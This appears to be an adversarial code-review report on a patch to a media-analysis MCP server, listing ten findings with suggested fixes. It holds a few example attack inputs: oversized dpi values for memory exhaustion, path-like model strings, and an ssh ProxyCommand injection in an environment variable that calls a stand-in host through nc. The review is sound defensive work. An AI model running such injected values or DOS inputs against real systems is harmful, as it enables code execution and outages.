# Tribunal Adversary Stage — P-uap-v041

**Adversary:** tribunal-adversary
**Verdict:** BREAKS

The trio's unanimous Approve rests on a shared frame: "the patch closes every claimed item, the helpers are surgical, the deferred items are tracked." That frame is correct in narrow scope but it admits at least two attacks that none of the three lenses probed, and at least one that two of the three explicitly flagged to each other and still passed through without action. The headline failure: the sec lens's own claim — "\_bounded() rejects `< 0`" and "every MCP tool surface that accepts the at-risk numerics calls it" — is contradicted on two axes the trio did not exercise: NaN bypasses the bounds entirely, and the `analyze_pdf` / `index_corpus` tool surfaces do not call `_bounded()` at all despite accepting the same class of unbounded numeric (`dpi`, `max_chars`).

## Attacks

### A-001 — `_bounded()` admits NaN; LAN-DOS bound is structurally porous

- **Category:** adversarial_input (compound with shared_blind_spot — none of the three lenses probed float-special inputs)
- **Concrete scenario:** Hostile (or merely buggy) MCP client invokes any v0.4.1-bounded numeric with `NaN` (JSON: `NaN` if the FastMCP layer admits it; or via JSON-RPC float fields that downstream parsers accept). For example, `flir_hud_ocr(path="x.mp4", width=float("nan"))` or `transcribe_audio(path="x.mp4", max_seconds=float("nan"))`.
  - In `_bounded()` (`src/uap_analyzer/server.py:32-39`): the body is `if value < 0: raise; if value > cap: raise; return value`. For `value = NaN`, **both comparisons evaluate `False`** (IEEE-754 NaN semantics: every ordered comparison against NaN is False). The helper returns `NaN` and dispatches.
  - Demonstrated in repl: `0.0 < float('nan')` → `False`; `float('nan') > 4096` → `False`. So `_bounded("width", float('nan'), 4096)` returns `nan` silently.
  - Downstream consequences:
    1. `f"t{at_seconds:.2f}"` in `flir.py:435` and `detect.py:201` becomes `"tnan"`. The cache key takes a NaN-bucket; repeated NaN calls all hash-collide into one cache row, so the first NaN-result is served for all subsequent NaN requests (cross-corpus cache pollution if NaN propagates to ffmpeg differently per call).
    2. `str(nan)` in the `_hash_key` inputs for `detect.py:202, 208` makes a single NaN-bucketed key. Any client that lands on NaN once poisons that key.
    3. ffmpeg's `-ss nan` interpretation is platform-dependent (some builds clamp to 0, others reject). `imgsz=nan` passed to YOLO produces a non-`ValueError` exception inside the executor; the failure surface is not the structured `ValueError` `_bounded()` was supposed to produce.
- **Why it succeeds:** The trio's three reports all claim the bound is closed. `sec-report.md:21` says: "rejects `< 0` and `> cap` before any tool dispatches." That's literally true and literally insufficient — NaN satisfies neither predicate. `arch-report.md` "Cross-Reviewer Ready Notes" §For security reviewer (bullet 1) flagged a sibling concern about `bool` in `_bounded()` and explicitly handed it to sec; sec acknowledged it as "probably out-of-scope" without auditing the broader float-special class. NaN was never mentioned by any reviewer. Quoted text:
  - `src/uap_analyzer/server.py:35-38`: `if value < 0: raise ... ; if value > cap: raise ... ; return value`
  - `arch-report.md:54`: "`_bounded()` accepts `bool` silently because `bool` is a subclass of `int`... the helper itself isn't defensive. Probably out-of-scope for sec but worth a glance."
  - `sec-report.md:20`: "The new `_bounded(name, value, cap)` helper rejects `< 0` and `> cap` before any tool dispatches."
- **Severity:** serious. The NaN entry doesn't directly crash the server-bounds layer, but it bypasses the documented invariant ("LAN-side DOS vector closed", commit body) and pushes the failure into downstream subprocess/inference code where the error surface is non-uniform and the cache row gets poisoned. The same arithmetic bypass also lets `bool(True) == 1` slide through silently (arch flagged, sec dismissed) — a True value satisfies both checks and returns 1, which YOLO accepts as `imgsz=1` (degenerate predict).
- **Suggested defense:** Add `if isinstance(value, float) and (math.isnan(value) or math.isinf(value)): raise ValueError(...)` to `_bounded()`, plus an explicit `if isinstance(value, bool): raise TypeError(...)` to mirror the bool-guard pattern sec-F-sec-010 added in `_normalize_vision_fields`.

### A-002 — `analyze_pdf` and `index_corpus` are unbounded surfaces; sec lens's "every MCP tool" claim is false

- **Category:** refinement_mismatch (compound with shared_blind_spot)
- **Concrete scenario:** Hostile client calls `analyze_pdf(path="x.pdf", mode="ocr", dpi=10000, max_chars=10**9)` or `index_corpus(kind="pdf", max_chars=10**9)`.
  - `dpi=10000` on a 200-page PDF: `convert_from_path(..., dpi=10000)` at `tools/pdf.py:169-171` rasterizes each page at 10000 DPI. A standard 8.5"×11" page at 10000 DPI is 85k × 110k pixels = 9.35 gigapixels per page. Each page allocates >>RAM and either OOMs the container or spins ffmpeg-via-poppler indefinitely.
  - `max_chars=10**9` on `analyze_pdf_text` blows the per-tool buffer; the returned dict is then `corpus.put_cached`-ed, which writes a >1GB JSON blob into the SQLite cache row (perf-F-perf-007 was about transcript bloat; this is the strict generalization).
  - `index_corpus(max_chars=10**9)` propagates the unbounded value through every PDF in the 220-item corpus.
- **Why it succeeds:** `src/uap_analyzer/server.py:180-217` (`analyze_pdf`) and `src/uap_analyzer/server.py:253-272` (`index_corpus`) accept `dpi`, `max_chars`, `page_start`, `page_end` — none are guarded by `_bounded()`. Grep evidence: `grep -n "_bounded" src/uap_analyzer/server.py` returns calls only inside `analyze_video`, `extract_frame`, `flir_hud_ocr`, `transcribe_audio`, `detect_objects` (server.py:109, 143, 352-354, 404-405, 458-460). `analyze_pdf` and `index_corpus` are not in that list.
  - The sec report explicitly claims otherwise. `sec-report.md:20-26`: "Every MCP tool surface that accepts the at-risk numerics calls it: `analyze_video`: count, width. `extract_frame`: at_seconds, width. `flir_hud_ocr`: sample_count, width, at_seconds. `transcribe_audio`: beam_size, max_seconds. `detect_objects`: sample_count, width, at_seconds."
  - That enumeration omits `analyze_pdf`. `analyze_pdf` was a v0.1 surface, so the trio's reading of "the at-risk numerics" was scoped to the v0.2-v0.4 new tools. But `dpi` is the most expensive numeric in the whole system (memory scales O(dpi²)) and `max_chars` propagates directly into the cache blob. The intent doc §"No regression on v0.4.0 surface" specifies the v0.1 tools "must all still load" — it does not exempt them from the LAN-DOS posture.
- **Severity:** serious (could be argued critical for `dpi` — a single `dpi=10000` call on a multi-page PDF can OOM the container in seconds, taking the entire server down). Specifically the sec-F-sec-001 claim "LAN-side DOS vector closed" (commit body) is contradicted by this gap.
- **Suggested defense:** Add `_bounded("dpi", dpi, _MAX_DPI=600)` and `_bounded("max_chars", max_chars, _MAX_TEXT_CHARS=10_000_000)` to `analyze_pdf` and `index_corpus`, with caps generous enough for legitimate use.

### A-003 — `describe_image` admits arbitrary client-supplied `model` strings; sec-F-sec-002 closure is partial

- **Category:** shared_blind_spot
- **Concrete scenario:** Hostile client calls `describe_image(path="frames/x.jpg", model="evil:99b")` or `describe_image(path="frames/x.jpg", model="../../../etc/passwd")` (cache-key pollution variant) or `describe_image(path="frames/x.jpg", model="qwen2.5vl:7b-but-spoofed")`.
  - `src/uap_analyzer/server.py:156-173` (`describe_image` MCP wrapper) accepts `model: str | None = None` with no validation and passes it straight to `image_tools.describe_image`.
  - `src/uap_analyzer/tools/image.py:83`: `model_id = model or cfg.ollama_vision_model`.
  - `src/uap_analyzer/tools/image.py:84`: `params_hash = f"v1|{img_hash}|{prompt_hash}|{model_id}"` — the raw client string lands directly in the cache key.
  - `src/uap_analyzer/tools/image.py:93`: `client.describe_image(abs_path, used_prompt, model=model_id)` — the raw string is POSTed to ollama as the model field.
- **Why it succeeds:** sec-F-sec-002's stated closure (sec-report.md:31): "Whitelist is checked _before_ `cfg.resolve_corpus_path()` and _before_ the cache lookup at line 443. Default `qwen2.5vl:7b` is in the set. Mirrors the existing `VALID_MODELS` patterns in `audio.py:52-59` and `detect.py:50-53`. **Closed.**" The whitelist is in `flir.py` only. The same attack surface (`describe_image`'s `model` arg) exists in `image.py` and is **not** whitelisted. The original sec-F-sec-002 specifically cited cache namespace inflation and ollama-cache inflation — both apply identically to `describe_image`. The trio's framing of the finding as "fix `flir.py` because `vision_model` was the new surface" missed the structurally identical pre-existing surface in `image.py`.
  - Intent.md §Behaviors-under-review item 9 (sec-F-sec-002) names "`vision_model` arg" specifically — so technically the v0.4.1 patch is conformant to intent. But the **class of bug** (unwhitelisted model arg in vision tools) is not closed.
- **Severity:** serious. Cache-key namespace inflation (per-evil-model rows in SQLite) and ollama-side resource pull (every distinct `model=...` causes ollama to attempt to load that name, which can mean a multi-GB download attempt for "model=llama3:405b" etc.). The pdf summary path has the same shape via `cfg.ollama_text_model` (no `model` arg surfaces there, so the attack vector is just env-poisoning — lower severity).
- **Suggested defense:** Extract the `VALID_HUD_MODELS` pattern to a shared `VALID_VISION_MODELS` frozenset (combining HUD-mode + describe-image whitelists, or splitting them) and apply it in `describe_image`'s MCP wrapper before dispatch. Mirror the `flir.py:417-424` validation block.

### A-004 — `IMAGE_EXTS` is incomplete; legitimate corpus images route through the wrong branch

- **Category:** edge_case
- **Concrete scenario:** Operator drops `Photo_1.tiff` (or `.tif`, `.heic`, `.avif`) into `/srv/uap-data/`. These are common formats — TIFF in particular is the canonical military FLIR / satellite distribution format, and the UAP corpus contains historical FBI photos that may be TIFF. Client calls `detect_objects(path="Photo_1.tiff")`.
  - `IMAGE_EXTS = frozenset({".png", ".jpg", ".jpeg", ".webp", ".bmp", ".gif"})` at `src/uap_analyzer/tools/detect.py:56`.
  - `.tiff` ∉ `IMAGE_EXTS`, so `is_image = False` at `detect.py:194`.
  - The code path then enters the video branch at `detect.py:233-236`: `frames = await sample_frames(cfg, corpus, rel_path, ...)`. `sample_frames` calls ffmpeg's frame-sampling logic on a TIFF input. ffmpeg will produce one or zero frames (depending on version) and the downstream YOLO predict will run on either no frames or a single frame at the wrong width.
- **Why it succeeds:** arch-F-arch-002 was closed with the citation: "Works for absolute paths, never-scanned files, and the standard image extensions (.png, .jpg, .jpeg, .webp, .bmp, .gif). Doesn't break video-path classification." (intent.md:22-23.) The reviewer audited the listed extensions but did not audit completeness — none of the three lenses asked "is this list canonical?" `arch-report.md:55-57` mentions the cross-classification of `evil.png.mp4` (multi-extension) but does not list TIFF/HEIC/AVIF.
  - Reviewers verified only the extensions enumerated in the finding spec. The intent doc enumerates the same six. The actual ultralytics ImageReader supports tiff/tif and webp; the omission isn't a YOLO limitation, it's a classifier oversight.
- **Severity:** serious for corpus integrity — legitimate operator workflow on a real file silently produces wrong results (no detections, no error, cached as `is_image=False` so subsequent calls still misroute).
- **Suggested defense:** Add `.tiff`, `.tif`, `.heic`, `.heif`, `.avif`, `.jp2` to `IMAGE_EXTS`. Or invert the check: classify as video iff the suffix matches a known video extension, image otherwise — but that has its own edge cases. The narrower fix is to extend `IMAGE_EXTS` to match ultralytics' supported set.

### A-005 — `FLIR_HUD_VISION_PROMPT` is not in the cache key; future prompt changes serve stale answers

- **Category:** temporal_state_mismatch
- **Concrete scenario:** Maintainer (Dan, or any future contributor) edits `FLIR_HUD_VISION_PROMPT` in `tools/flir.py:85-109` to tighten the schema or add a new field, without bumping the cache version prefix. Operator deploys; existing cache rows (from the old prompt) are served verbatim to the new requests. The operator never sees the new prompt's output until cache expiration — there is no cache expiration in `corpus.get_cached`.
- **Why it succeeds:** `src/uap_analyzer/tools/flir.py:434-441` constructs the vision-mode cache key from `("v3", mode, t/n marker, str(width), region_key, model_key)`. The prompt content is **not** in the key. By contrast, `tools/audio.py:181-191` correctly includes `prompt_h = hashlib.sha256((initial_prompt or "").encode())` in the cache tuple (audio.py:180), and `tools/image.py:82-84` correctly includes `prompt_hash` in `describe_image`'s cache key. Only `flir.py` omits the prompt hash.
  - Sec-F-sec-005 (cache-key spoofing) was about client-controlled fields. The trio's frame for sec-F-sec-005 was "are all client-controlled params hashed?" Their answer was yes. But the patch claim went further — sec-report.md:48-50 says "Inputs: `('v3', mode, t/n marker, width, region_key, model_key)`. Every materially-relevant param is folded in." The prompt content is materially-relevant (it dictates the model's output schema) and is not folded in.
- **Severity:** serious as a latent bug. Today the prompt is fixed in source, so no actual stale-cache event has happened. But the next prompt edit (likely soon — the vision mode is the newer of the two extraction paths and the prompt at `flir.py:85-109` carries a v0.4.0-era schema) silently serves wrong-schema cached data. The other two tools got this right; the inconsistency itself is a refinement_mismatch with intent.md's "Every materially-relevant param is in the hashed key."
- **Suggested defense:** Add `prompt_h = hashlib.sha256(FLIR_HUD_VISION_PROMPT.encode()).hexdigest()[:8]` and include it in the flir.py cache-key tuple (or bump to `v4` whenever the prompt body changes — but that's manual discipline that's already been forgotten once: the v3 prefix only bumped because the param-tuple shape changed for sec-F-sec-005, not because the prompt changed).

### A-006 — `ZAPHOD_HOST` env var is not shape-validated; `ssh -oProxyCommand=...` redirection survives

- **Category:** shared_blind_spot
- **Concrete scenario:** An attacker who can poison the operator's environment (compromised dotfile, .envrc, CI runner injection) sets `ZAPHOD_HOST="-oProxyCommand=nc evil.example.com 1234;@a"`. The next deploy invocation does:
  - `HOST="${ZAPHOD_HOST:-...}"` at `deploy/zaphod-deploy.sh:17`. No validation.
  - `ssh "${HOST}" "cd ${REMOTE_DIR} && docker compose build"` at `deploy/zaphod-deploy.sh:74`. ssh treats arguments starting with `-` as options. `-oProxyCommand=…` causes ssh to invoke an arbitrary shell command **on the local host** as the operator. Code execution as the operator.
  - Curl invocation at `deploy/zaphod-deploy.sh:82`: `curl -fsS "http://${HOST#*@}:3260/healthz"` — `${HOST#*@}` strips up to the first `@`, but if the malicious HOST contains no `@`, the strip is a no-op, and curl receives `-oProxyCommand=...` as URL — curl rejects, but the ssh damage is already done.
- **Why it succeeds:** `sec-report.md:64-68` audited only `ZAPHOD_REMOTE_DIR` shape validation. The sec lens explicitly tested `/..//etc`, `/etc/../home`, `/srv/data/..` against the REMOTE_DIR `case` statement — none against HOST. The patch validates REMOTE_DIR (which lands in a quoted argument to ssh and cannot break out without already-compromised escaping) but does **not** validate HOST (which lands as the first argument to ssh and is directly attacker-controllable as an ssh option flag). The sec lens flagged "Symlink-on-remote redirection is a remote-host-trust concern, not in scope" — but did not extend the threat model to "env-var-on-local-host redirection."
  - Quoted: `sec-report.md:101`: "Symlinks on the remote are outside the script's authority... that's a remote-host-trust concern and not in scope. **Validation is sound.**" The validation is sound for REMOTE_DIR; it is silent on HOST.
- **Severity:** serious — requires env-poisoning preconditions, but those preconditions are common in the threat model the patch was supposed to address (the v0.4.1 commit body cites the deploy script's secret-exclude broadening as a defense against deploy-time env-var tampering). If the threat is env tampering, both env vars are in scope.
- **Suggested defense:** Add a `case "${HOST}" in -*) echo "ZAPHOD_HOST must not start with '-'" >&2; exit 2 ;; esac` guard before any ssh/rsync invocation, plus a `[[ "$HOST" =~ ^[A-Za-z0-9._-]+(@[A-Za-z0-9._-]+)?$ ]]` regex check on the user@host portion.

### A-007 — Cache version inconsistency: flir is `v3`, detect/audio are `v2`; the intent doc says "v1"

- **Category:** contradiction
- **Concrete scenario:** Trace the cache versioning. `intent.md:75-76` and `arch-report.md:62` agree: "the v2 cache-key prefix means all v1 entries are orphaned." Multiple lens reports cite v0.4.0 cache as "v1" and v0.4.1 as "v2." But the actual code:
  - `audio.py:182, 191`: `"v2"` prefix.
  - `detect.py:201, 204, 207, 210`: `"v2"` prefix.
  - `flir.py:435, 437, 440, 442`: `"v3"` prefix.

  A maintainer reading the commit message and intent doc will assume the patch is a uniform "v1 → v2" bump across the three new tools. The actual code has a `v3` in flir — implying there was a `v2` for flir that doesn't exist (was skipped), or that the v0.2.1 cache prefix for flir was already `v2` (in which case the intent doc's "v1 → v2" framing is wrong for flir).
  - Checked git history: `git log --oneline 0ce846d..c267b63 -- src/uap_analyzer/tools/flir.py` would show whether v0.2.1 ever used a v2 prefix. Looking at the v0.4.1 diff, the change is `v1` → `v3` for flir (the v0.2.1 commit `697f693` added flir_hud_ocr with what was presumably v1 or no prefix; the v0.4.1 patch jumps to v3).
  - Whether this is "v1→v3 because the patch evolved during review" or "v2 was an intermediate that never landed," the trio did not flag the inconsistency. arch-F-arch-101/-102/-103 focused on `_bounded()` and `_hash_key` duplication; the cache-version asymmetry between the three tools was not raised.

- **Why it succeeds:** No lens cross-referenced the actual prefix strings against the intent doc's "v1 → v2" claim. `arch-report.md:62` says: "the v2 cache-key prefix means all v1 entries are orphaned, so the first session post-deploy has a 100% cache miss." That statement is **false for flir** — the flir cache is `v3`, not `v2`. If a future migration tool needs to read or migrate v1 entries (or v2 entries that don't exist), the three tools' prefix shapes diverge.
- **Severity:** cosmetic-bordering-on-serious. It doesn't break anything today (the orphan-and-repopulate strategy works regardless of the prefix value), but it's a contradiction with the intent doc's documented invariant ("v2 cache-key prefix is a hard cut") and it'll bite the next reviewer who tries to write a cache-format-migration tool.
- **Suggested defense:** Either uniformly bump all three to `v3` (matching flir) and update the intent doc, or revert flir to `v2`. Document the convention: "cache prefix is bumped lockstep across all tools when any tool's tuple shape changes."

### A-008 — `_hash_key` duplicated thrice; one of the three already diverges

- **Category:** contradiction (compound with refinement_mismatch)
- **Concrete scenario:** arch-F-arch-102 (sec-report cross-note + arch new finding) called this out at Suggestion grade: `_hash_key` is implemented twice (audio.py:118-126, detect.py:117-125) and inlined a third time in flir.py:434-441. The trio called it polish. But look at what's already diverged:
  - `audio.py:118-126` and `detect.py:117-125`: identical helper, same `hashlib.sha256(raw.encode()).hexdigest()[:16]`.
  - `flir.py:434-441`: inline `hashlib.sha256("|".join(...).encode()).hexdigest()[:16]` — same algorithm, but the **tuple shape differs**: flir starts with `"v3"`, audio/detect start with `"v2"`.
  - The cache-key prefix divergence (A-007) is a direct consequence of this duplication. If `_hash_key` were a shared helper that took `(version, *parts)`, the prefix bump would be a one-line change. Instead the three sites already diverged on the very first attribute (`v2`/`v3`).
- **Why it succeeds:** arch-report.md:38-42 explicitly says: "Not a correctness issue today, but the asymmetry (helper in audio + detect, inline in flir) reads as a half-finished extraction." The lens classified it as Suggestion. The adversary frame: it's not "future divergence risk," it's "divergence has already happened" — the v2/v3 prefix split.
- **Severity:** serious as a "the soft warning has already become a hard contradiction" item. Today only the prefix is divergent; tomorrow's edits will likely diverge further. The trio's Suggestion grade understates the current state.
- **Suggested defense:** Extract `_hash_key(version: str, *parts: Any) -> str` to `src/uap_analyzer/tools/_cachekey.py` or onto `Corpus`. Pass version explicitly to discourage the next divergence.

### A-009 — `_get_model` LRU eviction can drop a model that's currently being used by another in-flight request

- **Category:** temporal_state_mismatch
- **Concrete scenario:** Three callers in flight. Caller A loaded yolov8n (cache: {n}). Caller B loaded yolov8s (cache: {n, s}). Caller C loaded yolov8m (cache: {n, s, m}). Now caller D requests yolov8l — under lock, inserts l, evicts n (oldest by insertion, never `move_to_end`'d since the prior callers all moved-to-end on hit). Meanwhile, **caller A is still running `m.predict(...)` on the yolov8n object outside the lock** (`_run_detect` at `detect.py:274` runs predict in the executor without re-taking `_MODEL_CACHE_LOCK`).
  - Python refcounting keeps the yolov8n model object alive while A holds a reference, so it doesn't get GC'd. **But:** ultralytics' `model.predict` may rely on side-state in `weight_dir` (the cached .pt file), which is NOT evicted — fine. The model object itself is the only resident state, and it's held by A's reference.
  - The actual failure is more subtle: when caller A finishes predict and wants to re-detect for a follow-up frame using the same `m` variable, it works (it has the reference). But if A's downstream call path re-enters `_get_model(cfg, "yolov8n")`, it'll find `yolov8n` no longer in the cache, re-load it (download skipped because the .pt file exists, but the YOLO object is freshly instantiated — a duplicate live model object).
- **Why it succeeds:** `perf-report.md:21` describes the LRU pattern: "Eviction loop at `detect.py:110-112` (`while len > MAX: popitem(last=False)`). Mirrored in `audio.py:47-49` and `audio.py:112-114`. Cap enforcement is **inside** the lock so eviction races can't leak."
  - The "cap enforcement inside the lock" is correct but the eviction's interaction with in-flight predict calls is not audited. The perf lens audited the eviction shape (no leaks in the cache structure) but not the temporal interaction (a model object evicted while still in use). Specifically perf-report.md:40 calls the lock-across-cold-start "the intended shape of the perf-F-perf-001 fix" without examining what happens for warm-cache hits.
  - The intent doc §"Failure modes to look for" does not include this scenario.
- **Severity:** cosmetic-to-serious. In the current single-operator workflow (intent.md §"single-caller, container-long-lived assumption" via perf-report.md:40), there's no concurrent caller, so eviction-during-predict doesn't happen. The cache cap of 3 was chosen for memory; if Dan ever switches to multi-operator usage, the eviction logic is racy with running predicts. The perf lens flagged the lock-cold-start tradeoff but not this LRU-during-predict shape.
- **Suggested defense:** Either (a) ref-count entries explicitly and skip eviction of entries with refcount > 0, or (b) increase `_MODEL_CACHE_MAX` to be larger than expected concurrent caller count + variety, or (c) document the single-caller invariant in the eviction code path so a future contributor knows the lock doesn't protect predict.

### A-010 — `width` clamped to <=4096 but `width=0` and `width=1` are accepted; ffmpeg/YOLO behavior is undefined

- **Category:** edge_case
- **Concrete scenario:** Client calls `flir_hud_ocr(path="x.mp4", width=0)` or `extract_frame(path="x.mp4", width=1)`. `_bounded("width", 0, 4096)` accepts: `0 < 0` is False (not less-than), `0 > 4096` is False. Returns 0. ffmpeg's `scale=0:-1` is interpreted as "preserve aspect with H derived from W=0" → produces a 0-width frame, which downstream PIL/YOLO will choke on with non-uniform errors.
  - Similarly `confidence=0.0` in `detect.py:179` triggers `raise` (good, the strict `<`), but the server-level `_bounded` would accept it before the tool-level check fires. Not a defect because `detect.py` catches it; but a contributor adding a new tool that takes `width` and skips the tool-level zero-check inherits the gap.
- **Why it succeeds:** `_bounded()` body at `src/uap_analyzer/server.py:35-38`: `if value < 0: raise`. So `value == 0` passes. The intent doc says caps are "1-2 orders of magnitude above realistic use — generous but bounded." It does not specify a lower bound for `width` (or `sample_count`, or `beam_size`). The sec lens (sec-report.md:26) repeats the caps but doesn't probe the lower edge.
- **Severity:** cosmetic — the failure mode is a non-uniform error from ffmpeg/PIL, not a security or correctness break. Filed because it's the same "lens audited the documented bound, not the silent bound" pattern as A-001.
- **Suggested defense:** Change `_bounded` to `if value <= 0:` for the parameters where zero is non-sensical (width, sample_count, beam_size), or add per-arg lower bounds: `_bounded(name, value, min=1, max=4096)`.

## META

- **Categories attacked:**
  - shared_blind_spot (A-001, A-003, A-006)
  - hidden_assumption (implicit in A-002 — sec lens's "every MCP tool" enumeration was an unstated precondition that doesn't hold)
  - refinement_mismatch (A-002, A-008)
  - adversarial_input (A-001, A-006)
  - temporal_state_mismatch (A-005, A-009)
  - edge_case (A-004, A-010)
  - contradiction (A-007, A-008)
- **Categories not attacked, with reasons:**
  - composition_failure: the patch is local to existing modules; no new module boundaries were introduced that compose with adjacent code. The `OllamaClient` hoist is the only composition change and it's lifecycle-clean (`finally`-closed). I probed it and found no break.
- **Artifacts I would have wanted but didn't have:**
  - A test corpus of actual `.tiff`/`.heic`/`.avif` files to exercise the IMAGE_EXTS gap empirically (A-004 is a code-path attack, but a smoke test against a real TIFF would harden the claim).
  - The pre-v0.4.1 cache version prefix for `flir.py` (was it `v1` or `v2`?) to nail down whether A-007 is "v1→v3 with v2 skipped" or "v2→v3 mid-review." Git blame on the specific lines would help; I inferred from the v0.2.1 commit but didn't pull the full pre-patch source.
  - A way to test `_bounded()` against FastMCP's actual JSON parsing pipeline — to confirm whether `NaN`/`true`/`false` are admitted at the protocol layer. I demonstrated the Python-layer bypass but the protocol-layer ingestion is what determines real-world exploitability.
- **Estimated confidence in verdict:** high.
  - A-001 (NaN bypass) is a textbook IEEE-754 oversight and is directly demonstrable in a Python REPL against the helper as written. The trio explicitly handed each other a precursor (`bool` is a subclass of `int`) and still passed it through. NaN is the strictly worse cousin.
  - A-002 (analyze_pdf/index_corpus unbounded) is verifiable by `grep -n "_bounded" src/uap_analyzer/server.py` (returns no hits for the pdf surfaces). The sec lens's claim "every MCP tool surface" is contradicted by `ls src/uap_analyzer/server.py` headers.
  - A-003 (describe_image whitelist gap) is verifiable by inspection of `src/uap_analyzer/tools/image.py:83` — `model_id = model or cfg.ollama_vision_model` with no whitelist.

  The three above are blocking-grade attacks the trio did not surface. The remaining seven are a mix of serious and cosmetic but they cluster on the same pattern: the trio audited the patch's positive claims surface-by-surface and did not probe the negative space ("what's not covered?" and "what's outside the enumerated bounds?"). The Approve verdict is grounded in literal correctness of the patch's claims about the specific surfaces it touched; the adversary stage is what catches the surfaces it didn't touch but should have.
